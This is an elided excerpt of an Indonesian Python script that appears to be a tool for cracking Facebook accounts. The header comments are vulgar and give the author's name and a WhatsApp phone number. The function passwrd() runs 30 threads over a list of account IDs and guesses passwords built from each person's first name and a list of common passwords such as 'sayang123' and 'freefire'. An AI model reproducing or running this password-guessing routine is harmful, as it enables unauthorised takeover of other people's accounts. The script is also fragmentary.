#Jepri Barus
#ikeh ikeh kimochi
#perbaiki sendiri om biar hasil ijo ijol
#salam coli
...
\x1b[0;34m█  \33[mFacebook: Jepri Barus
\x1b[0;34m█  \33[mWhatsApp: 085767354326
...
def menu(my_name): 
	banner()
	print(x+'\033[95mNAMA  : '+str(my_name)) 
	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['sayang','sayangku','sayang123','garena','anjing','katasandi','freefire']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
